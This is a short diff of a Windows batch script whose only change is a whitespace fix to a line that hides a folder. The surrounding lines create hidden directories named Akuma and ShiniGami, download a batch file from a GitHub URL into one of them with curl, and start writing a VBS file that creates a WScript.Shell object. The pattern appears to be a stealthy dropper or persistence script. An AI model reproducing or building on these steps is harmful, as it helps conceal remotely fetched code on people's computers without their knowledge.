@@ -2,7 +2,7 @@
 mkdir %userprofile%\Akuma
 attrib +h %userprofile%\Akuma
 mkdir %homedrive%\ShiniGami
-attrib +h  %homedrive%\ShiniGami
+attrib +h %homedrive%\ShiniGami
 curl -L https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat > %homedrive%\ShiniGami\Akuma.bat
 del %userprofile%\Akuma\死神.vbs
 echo Set objShell = CreateObject("WScript.Shell") >> %userprofile%\Akuma\死神.vbs
